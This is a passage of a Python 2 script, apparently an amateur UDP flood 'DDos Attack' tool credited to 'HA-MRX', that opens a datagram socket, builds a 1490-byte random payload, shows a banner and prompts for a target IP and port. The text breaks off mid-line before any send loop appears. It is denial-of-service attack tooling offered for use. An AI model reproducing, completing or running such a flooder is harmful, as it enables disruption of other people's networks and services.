import sys, threading
threading.Thread(target=lambda: sys.stdout.write('\x1b[1;32m')).start() #green text

import os
import sys
import time
import socket
import random

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print "Author   : HA-MRX"
print "You Tube : https://www.youtube.com/c/HA-MRX"
print "github   : https://github.com/Ha3MrX"
print "Facebook : https://www.facebook.com/muhamad.jabar222"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear
